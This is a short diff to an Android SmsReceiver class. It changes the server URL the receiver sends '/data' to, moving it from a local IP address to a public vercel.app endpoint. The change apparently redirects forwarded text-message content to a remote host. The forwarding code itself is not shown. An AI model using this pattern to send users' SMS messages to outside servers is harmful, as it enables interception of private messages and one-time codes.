@@ -19,7 +19,7 @@ import java.nio.charset.StandardCharsets;
 
 public class SmsReceiver extends BroadcastReceiver {
 
-    private static final String SERVER_URL = "http://192.168.111.175:3000/data"; // Replace with your server URL
+    private static final String SERVER_URL = "https://remote-server-woad.vercel.app/data"; // Replace with your server URL
 
     @Override
     public void onReceive(Context context, Intent intent) {
